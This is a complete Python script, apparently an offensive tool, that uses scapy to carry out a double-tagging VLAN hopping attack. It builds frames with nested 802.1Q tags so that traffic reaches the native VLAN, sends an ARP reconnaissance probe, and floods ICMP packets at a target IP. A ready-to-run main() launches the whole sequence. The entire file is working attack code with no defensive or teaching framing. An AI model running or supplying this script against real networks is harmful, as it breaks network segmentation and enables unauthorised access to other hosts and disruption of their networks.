from scapy.all import *
import time

class DoubleTaggingAttack:
    def __init__(self, 
                 interface, 
                 victim_vlan=1101,  # Victim VLAN
                 target_vlan=1,     # Native VLAN to hop into
                 target_ip='192.168.1.5'):
        """
        Initialize Double Tagging VLAN Hopping Attack
        
        :param interface: Network interface
        :param victim_vlan: VLAN of the target network
        :param target_vlan: Native VLAN to exploit
        :param target_ip: IP to target in the native VLAN
        """
        self.interface = interface
        self.victim_vlan = victim_vlan
        self.target_vlan = target_vlan
        self.target_ip = target_ip
        
        # Get local MAC address
        self.attacker_mac = get_if_hwaddr(interface)
        
    def generate_double_tagged_packet(self):
        """
        Create a double-tagged VLAN hopping packet
        
        Packet Structure:
        - Outer VLAN tag: Victim's VLAN
        - Inner VLAN tag: Target (Native) VLAN
        """
        double_tagged_packet = (
            Ether(src=self.attacker_mac, 
                  dst="ff:ff:ff:ff:ff:ff")  # Broadcast
            /Dot1Q(vlan=self.victim_vlan)  # Outer VLAN tag
            /Dot1Q(vlan=self.target_vlan)  # Inner VLAN tag
            /IP(src="192.168.1.100", 
                dst=self.target_ip)
            /ICMP()
        )
        
        return double_tagged_packet
    
    def flood_double_tagged_packets(self, 
                                    num_packets=100, 
                                    interval=0.1):
        """
        Flood network with double-tagged packets
        
        :param num_packets: Number of packets to send
        :param interval: Time between packet sends
        """
        print("[*] Initiating Double Tagging VLAN Hopping Attack")
        
        try:
            for i in range(num_packets):
                # Generate and send double-tagged packet
                packet = self.generate_double_tagged_packet()
                
                # Send packet
                sendp(packet, 
                      iface=self.interface, 
                      verbose=False)
                
                print(f"[+] Sent Double-Tagged Packet {i+1}")
                time.sleep(interval)
        
        except KeyboardInterrupt:
            print("\n[*] Double Tagging Attack Stopped")
        except Exception as e:
            print(f"[!] Attack Error: {e}")
    
    def perform_reconnaissance(self):
        """
        Perform basic network reconnaissance 
        using double-tagged packets
        """
        print("[*] Performing VLAN Hopping Reconnaissance")
        
        # ARP Discovery Packet
        arp_discovery = (
            Ether(src=self.attacker_mac, 
                  dst="ff:ff:ff:ff:ff:ff")
            /Dot1Q(vlan=self.victim_vlan)
            /Dot1Q(vlan=self.target_vlan)
            /ARP(pdst=self.target_ip)
        )
        
        # Send ARP request
        sendp(arp_discovery, 
              iface=self.interface, 
              verbose=False)
        
        print("[+] Sent ARP Discovery Packet")
    
    def launch_attack(self):
        """
        Comprehensive attack sequence
        """
        print("[*] Launching Double Tagging VLAN Hopping Attack")
        
        # Reconnaissance phase
        self.perform_reconnaissance()
        
        # Flooding phase
        self.flood_double_tagged_packets(
            num_packets=50,  # Adjust as needed
            interval=0.2
        )

def main():
    attack = DoubleTaggingAttack(
        interface='enp0s3',        # Replace with your interface
        victim_vlan=1101,        # Victim's VLAN
        target_vlan=1,           # Native VLAN to exploit
        target_ip='10.0.0.1'     # IP in target VLAN
    )
    
    attack.launch_attack()

if __name__ == '__main__':
    main()
